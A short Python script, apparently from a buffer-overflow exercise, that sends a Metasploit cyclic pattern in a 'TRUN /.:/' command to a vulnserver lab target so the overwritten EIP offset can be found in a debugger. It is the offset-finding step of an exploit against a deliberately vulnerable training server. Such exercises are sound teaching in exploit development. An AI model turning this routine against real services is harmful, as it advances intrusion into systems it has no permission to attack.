#!/usr/bin/python

"""This program is designed for fuzzing purposes in a buffer-overflow attack (using vulnserver). It takes the IP and port of your target machine,
   as well as the offset detection payload generated by through a metasploit script, pattern_create.rb. The value stored in the buffer EIP register
    (discovered through Immunity Debugger) will then be used to identify the exact EIP offset value"""

import sys, socket

# Target ip address
ip = raw_input("Please enter the target ip: ")
# Target machine port
port = int(raw_input("Please enter the target port: "))
# Payload
offset = raw_input("Please enter the offet value: ")

try:
	# Establish connection 
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((ip, port))
	
	# Send payload
	s.send(('TRUN /.:/' + offset))
	s.close()

except:
	print("Error connecting to the server!")
	sys.exit()


